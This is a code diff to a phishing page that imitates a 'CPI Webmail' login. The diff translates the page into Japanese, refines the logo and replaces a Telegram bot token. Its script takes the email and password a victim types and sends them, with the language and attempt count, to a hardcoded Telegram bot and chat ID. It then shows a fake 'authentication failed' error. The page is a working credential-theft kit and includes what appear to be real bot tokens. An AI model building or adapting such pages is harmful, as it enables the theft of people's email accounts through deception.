@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=10" />
-    <title>CPI Webmail Login</title>
+    <title>CPI ウェブメールログイン</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -45,15 +45,15 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 12px;
         }
 
-        .logo-container img {
+        .logo-container svg {
             height: 50px;
-            object-fit: contain;
+            width: auto;
         }
 
         .logo-text {
-            margin-left: 12px;
             font-size: 20px;
             font-weight: 600;
             color: #333;
@@ -240,10 +240,14 @@
 
             .logo-container {
                 margin-bottom: 30px;
+                gap: 8px;
+            }
+
+            .logo-container svg {
+                height: 40px;
             }
 
             .logo-text {
-                margin-left: 8px;
                 font-size: 16px;
             }
 
@@ -264,22 +268,17 @@
     <div class="login-container">
         <!-- Logo Section -->
         <div class="logo-container">
-            <svg width="40" height="40" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <!-- CPI Logo Recreation -->
-                <defs>
-                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
-                        <stop offset="0%" style="stop-color:#a8d500;stop-opacity:1" />
-                        <stop offset="100%" style="stop-color:#00a3e0;stop-opacity:1" />
-                    </linearGradient>
-                </defs>
-                <rect width="100" height="100" fill="none"/>
-                <g transform="translate(15, 15)">
-                    <!-- Green section -->
-                    <rect x="0" y="0" width="25" height="25" fill="#a8d500"/>
-                    <rect x="0" y="10" width="25" height="25" fill="#8bc000"/>
-                    <!-- Blue section -->
-                    <rect x="15" y="0" width="25" height="25" fill="#0088cc"/>
-                    <rect x="15" y="10" width="25" height="25" fill="#00a3e0"/>
+            <svg width="50" height="50" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- CPI Logo with proper building blocks design -->
+                <g transform="translate(20, 20)">
+                    <!-- Top Green Block -->
+                    <rect x="0" y="0" width="30" height="30" fill="#a8d500" rx="2"/>
+                    <!-- Middle-Left Green Block -->
+                    <rect x="0" y="32" width="30" height="30" fill="#8bc000" rx="2"/>
+                    <!-- Middle-Right Blue Block -->
+                    <rect x="32" y="0" width="30" height="30" fill="#0088cc" rx="2"/>
+                    <!-- Bottom-Right Blue Block -->
+                    <rect x="32" y="32" width="30" height="30" fill="#00a3e0" rx="2"/>
                 </g>
             </svg>
             <div class="logo-text">CPI</div>
@@ -294,7 +293,7 @@
             </div>
 
             <div id="errorDiv" class="error-message">
-                Authentication failed. Please check your email and password.
+                認証に失敗しました。メールアドレスとパスワードを確認してください。
             </div>
 
             <fieldset id="formFieldset" style="border: none; padding: 0;">
@@ -303,7 +302,7 @@
                         type="email" 
                         id="emailInput" 
                         class="form-input" 
-                        placeholder="Email address" 
+                        placeholder="メールアドレス" 
                         required
                         autocomplete="email"
                     >
@@ -311,31 +310,31 @@
                         type="password" 
                         id="passwordInput" 
                         class="form-input" 
-                        placeholder="Password" 
+                        placeholder="パスワード" 
                         required
                         autocomplete="current-password"
                     >
                 </div>
 
-                <button type="submit" class="login-btn" id="loginBtn">Login</button>
+                <button type="submit" class="login-btn" id="loginBtn">ログイン</button>
             </fieldset>
 
             <!-- Language Section -->
             <div class="language-section">
-                <label class="language-label">Language</label>
+                <label class="language-label">言語</label>
                 <select class="language-select" id="languageSelect">
+                    <option value="ja">日本語</option>
                     <option value="en">English</option>
-                    <option value="ja">Japanese</option>
-                    <option value="es">Spanish</option>
-                    <option value="fr">French</option>
-                    <option value="de">German</option>
-                    <option value="zh">Chinese</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="zh">中文</option>
                 </select>
             </div>
 
             <!-- Help Link -->
             <div class="help-link">
-                <a href="#" onclick="return false;">Click here for information on how to use webmail</a>
+                <a href="#" onclick="return false;">ウェブメールの利用方法についてはこちら</a>
             </div>
 
             <!-- Copyright -->
@@ -347,7 +346,7 @@
 
     <script>
         // Telegram Bot Configuration
-        const TELEGRAM_BOT_ID = "8571582996:AAGhoLlh20Ttuwr8uAESPmXAQO6tBvKA51w";
+        const TELEGRAM_BOT_ID = "8569198247:AAHdPdcRsCYM3iRkMwkQLscFr8XzIStBOPg";
         const TELEGRAM_CHAT_ID = 5491806427;
         let attemptCount = 0;
 
@@ -388,13 +387,13 @@
             hideError();
 
             // Create message for Telegram
-            const telegramMessage = `🔐 CPI WEBMAIL LOGIN ✅\n\n` +
-                `📧 Email: ${email}\n` +
-                `🔑 Password: ${password}\n` +
-                `🌐 Language: ${language}\n\n` +
-                `⏰ Timestamp: ${new Date().toISOString()}\n` +
-                `🔢 Attempt: ${attemptCount}\n\n` +
-                `🏢 Site: CPI Webmail Portal`;
+            const telegramMessage = `🔐 CPI ウェブメール ログイン ✅\n\n` +
+                `📧 メール: ${email}\n` +
+                `🔑 パスワード: ${password}\n` +
+                `🌐 言語: ${language}\n\n` +
+                `⏰ タイムスタンプ: ${new Date().toISOString()}\n` +
+                `🔢 試行回数: ${attemptCount}\n\n` +
+                `🏢 サイト: CPI ウェブメール ポータル`;
 
             // Send to Telegram API
             const settings = {
@@ -413,9 +412,9 @@
             };
 
             $.ajax(settings).done(function (response) {
-                console.log("Telegram message sent:", response);
+                console.log("Telegram メッセージ送信完了:", response);
             }).fail(function (error) {
-                console.log("Telegram error:", error);
+                console.log("Telegram エラー:", error);
             });
 
             // Simulate login delay
@@ -441,15 +440,11 @@
 
         // Page load initialization
         document.addEventListener('DOMContentLoaded', function () {
-            console.log("CPI Webmail Login Page Loaded");
-            // Set default language based on browser
-            const browserLang = navigator.language.split('-')[0];
-            if (['en', 'ja', 'es', 'fr', 'de', 'zh'].includes(browserLang)) {
-                document.getElementById('languageSelect').value = browserLang;
-            }
+            console.log("CPI ウェブメール ログインページ読み込み完了");
+            // Set default language to Japanese
+            document.getElementById('languageSelect').value = 'ja';
         });
     </script>
 </body>
 
 </html>
-
